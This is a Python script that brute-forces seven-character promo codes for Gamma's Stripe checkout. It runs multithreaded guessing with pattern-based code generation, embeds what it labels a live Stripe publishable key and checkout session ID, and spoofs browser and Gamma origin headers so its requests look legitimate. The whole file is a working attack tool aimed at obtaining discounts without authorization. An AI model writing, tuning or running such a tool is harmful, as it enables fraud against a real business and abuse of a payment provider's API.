#!/usr/bin/env python3
"""
Rapid Promo Code Hunter for Gamma/Stripe - Ultra fast brute force with intelligent patterns
Focused on speed and efficiency
"""

import json
import time
import urllib.request
import urllib.error
import urllib.parse
import random
import string
import threading
from datetime import datetime
from queue import Queue
import concurrent.futures

# Configuration
# Stripe checkout session ID from Gamma billing page
CHECKOUT_SESSION_ID = "cs_live_b1rSDhKOm0RPZNr16MgX3aidRbrwjHhfaCDYWHZPTJyC6KJdRMsxwqGj0i"
STRIPE_PUBLISHABLE_KEY = "pk_live_51MS6sAE3HBB5yrHt6gBd276SL4CGS2kGGPA4gkYgfOdKB3g9E1HMaUyoEi0Z47s0h1FVD1MuYaZ3Ay32U13xqeH400NPSkhlYc"

# Try Stripe promotion codes API endpoint
API_URL_BASE = "https://api.stripe.com/v1/promotion_codes/"
# Alternative: Checkout session validation endpoint
CHECKOUT_API_URL = f"https://api.stripe.com/v1/checkout/sessions/{CHECKOUT_SESSION_ID}"

CODE_LENGTH = 7  # Changed from 16 to 7 for Gamma format
CHARSET = string.ascii_uppercase + string.digits
DELAY = 0.3  # Slightly slower for Stripe rate limits
MAX_WORKERS = 3  # Number of parallel threads
BATCH_SIZE = 50  # Codes to generate in each batch

# Global statistics
stats = {
    'total_checked': 0,
    'valid_found': 0,
    'error_count': 0,
    'start_time': time.time()
}

valid_codes = []
checked_codes = set()
stats_lock = threading.Lock()


def check_code(code):
    """Check a single promo code using Stripe API"""
    # Try promotion codes endpoint first
    url = API_URL_BASE + urllib.parse.quote(code)
    
    req = urllib.request.Request(url)
    req.add_header('Authorization', f'Bearer {STRIPE_PUBLISHABLE_KEY}')
    req.add_header('Accept', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0')
    req.add_header('Origin', 'https://billing.gamma.app')
    req.add_header('Referer', f'https://billing.gamma.app/c/pay/{CHECKOUT_SESSION_ID}')
    
    try:
        with urllib.request.urlopen(req, timeout=8) as response:
            data = response.read()
            result = json.loads(data)
            
            # Stripe promotion code response structure
            # Valid code returns object with 'id', 'active', etc.
            # Invalid returns error object
            if 'id' in result and result.get('active', False):
                return True, None
            else:
                return False, None
                
    except urllib.error.HTTPError as e:
        if e.code == 404:
            # Code not found - invalid
            return False, None
        elif e.code == 401 or e.code == 403:
            # Auth issue - might need different approach
            return False, f"Auth error {e.code}"
        else:
            return False, f"HTTP {e.code}"
    except Exception as e:
        return False, str(e)


def generate_targeted_codes(strategy="mixed"):
    """Generate codes using different strategies - adapted for 7 character length"""
    
    if strategy == "common_prefixes":
        # Common promo code prefixes (shorter for 7 chars)
        prefixes = ["SAVE", "DISC", "PROM", "GIFT", "FREE", "COUP", "DEAL", "SPEC"]
        prefix = random.choice(prefixes)
        if len(prefix) >= CODE_LENGTH:
            prefix = prefix[:CODE_LENGTH-1]
        remaining = CODE_LENGTH - len(prefix)
        suffix = ''.join(random.choices(CHARSET, k=remaining))
        return prefix + suffix
    
    elif strategy == "year_patterns":
        # Include current year patterns
        patterns = ["2024", "2025", "24", "25"]
        pattern = random.choice(patterns)
        if len(pattern) >= CODE_LENGTH:
            pattern = pattern[:CODE_LENGTH-1]
        remaining = CODE_LENGTH - len(pattern)
        
        # Insert pattern at random position
        pos = random.randint(0, remaining)
        prefix = ''.join(random.choices(CHARSET, k=pos))
        suffix = ''.join(random.choices(CHARSET, k=remaining - pos))
        return prefix + pattern + suffix
    
    elif strategy == "sequential":
        # Try sequential variations around known codes
        base_chars = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        code = ""
        for _ in range(CODE_LENGTH):
            code += random.choice(base_chars)
        return code
    
    elif strategy == "balanced":
        # Balanced mix of letters and numbers
        letters_count = CODE_LENGTH // 2
        numbers_count = CODE_LENGTH - letters_count
        letters = random.choices(string.ascii_uppercase, k=letters_count)
        numbers = random.choices(string.digits, k=numbers_count)
        chars = letters + numbers
        random.shuffle(chars)
        return ''.join(chars)
    
    else:  # random
        return ''.join(random.choices(CHARSET, k=CODE_LENGTH))


def worker_thread(thread_id, strategies):
    """Worker thread for checking codes"""
    global stats, valid_codes, checked_codes
    
    local_checked = 0
    local_valid = 0
    local_errors = 0
    
    while True:
        try:
            # Generate batch of codes
            codes_to_check = []
            for _ in range(BATCH_SIZE):
                strategy = random.choice(strategies)
                code = generate_targeted_codes(strategy)
                
                with stats_lock:
                    if code not in checked_codes:
                        checked_codes.add(code)
                        codes_to_check.append((code, strategy))
            
            # Check each code in the batch
            for code, strategy in codes_to_check:
                is_valid, error = check_code(code)
                local_checked += 1
                
                if is_valid:
                    local_valid += 1
                    with stats_lock:
                        valid_codes.append(code)
                        print(f"\n🎉 [Thread-{thread_id}] FOUND VALID: {code} (strategy: {strategy})")
                        
                        # Save immediately
                        with open('rapid_valid_codes.txt', 'a') as f:
                            f.write(f"{code}\n")
                
                elif error:
                    local_errors += 1
                
                # Update global stats periodically
                if local_checked % 10 == 0:
                    with stats_lock:
                        stats['total_checked'] += 10
                        stats['valid_found'] = len(valid_codes)
                        stats['error_count'] += local_errors
                        local_errors = 0
                
                time.sleep(DELAY)
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
            time.sleep(1)
    
    # Update final stats
    with stats_lock:
        stats['total_checked'] += local_checked % 10
        stats['valid_found'] = len(valid_codes)


def print_status():
    """Print current status"""
    while True:
        time.sleep(10)  # Update every 10 seconds
        
        with stats_lock:
            elapsed = time.time() - stats['start_time']
            rate = stats['total_checked'] / elapsed if elapsed > 0 else 0
            
            print(f"\n📊 STATUS UPDATE:")
            print(f"   Time: {elapsed:.1f}s | Checked: {stats['total_checked']} | Valid: {stats['valid_found']} | Rate: {rate:.1f}/s")
            print(f"   Errors: {stats['error_count']} | Unique checked: {len(checked_codes)}")
            
            if valid_codes:
                print(f"   🎊 Valid codes found: {valid_codes}")


def main():
    """Main rapid hunting function"""
    print("⚡ RAPID GAMMA PROMO CODE HUNTER")
    print("=" * 50)
    print(f"Target: Gamma/Stripe | Code Length: {CODE_LENGTH}")
    print(f"Workers: {MAX_WORKERS} | Delay: {DELAY}s | Batch: {BATCH_SIZE}")
    print("Strategies: common_prefixes, year_patterns, sequential, balanced, random")
    print("=" * 50)
    
    # Define strategies to use
    strategies = ["common_prefixes", "year_patterns", "sequential", "balanced", "random"]
    
    # Start status printer thread
    status_thread = threading.Thread(target=print_status, daemon=True)
    status_thread.start()
    
    # Start worker threads
    threads = []
    for i in range(MAX_WORKERS):
        t = threading.Thread(target=worker_thread, args=(i+1, strategies))
        t.daemon = True
        t.start()
        threads.append(t)
        print(f"🚀 Started worker thread {i+1}")
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n⏹️  Rapid hunt stopped by user")
        
        # Final stats
        elapsed = time.time() - stats['start_time']
        rate = stats['total_checked'] / elapsed if elapsed > 0 else 0
        
        print(f"\n📈 FINAL STATISTICS:")
        print(f"   Time elapsed: {elapsed:.1f}s")
        print(f"   Total checked: {stats['total_checked']}")
        print(f"   Valid found: {stats['valid_found']}")
        print(f"   Error count: {stats['error_count']}")
        print(f"   Average rate: {rate:.2f} codes/second")
        print(f"   Unique codes checked: {len(checked_codes)}")
        
        if valid_codes:
            print(f"\n🏆 VALID CODES DISCOVERED:")
            for i, code in enumerate(valid_codes, 1):
                print(f"   {i}. {code}")
            print(f"\n💾 Saved to: rapid_valid_codes.txt")
        else:
            print(f"\n😔 No valid codes found this session")


if __name__ == "__main__":
    main()


